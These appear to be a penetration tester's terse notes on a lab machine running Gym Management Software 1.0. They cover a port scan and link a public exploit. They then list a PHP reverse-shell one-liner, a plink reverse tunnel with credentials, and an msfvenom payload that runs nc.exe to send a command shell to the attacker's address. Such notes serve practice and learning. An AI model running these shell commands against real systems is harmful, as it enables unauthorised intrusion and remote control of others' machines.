Only two ports   
Discovered open port 8080/tcp on 10.10.10.198                                  
Discovered open port 7680/tcp on 10.10.10.198 

---------
8080 is web server 

7680 is windows update delivery  

-----------------------------------------
Runnning dirb while I check via browser
 
In the about us page it shows gym management software 1.0
and by projectworlds.in

There is an exploit for it

https://www.exploit-db.com/exploits/48506

Visiting upload.php I see that there is 
Notice: Undefined index: id in C:\xampp\htdocs\gym\upload.php on line 4
So xampp is running so apache on windows 


php -r '$sock=fsockopen("10.10.14.48",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

-----------------------------------------


.\plink.exe -l user -pw toor 10.10.14.48 -R 8888:127.0.0.1:8888

msfvenom -p windows/exec CMD='C:\xampp\htdocs\gym\upload\nc.exe -e cmd.exe 10.10.14.48 1234' -b '\x00\x0A\x0D' -f p -v payload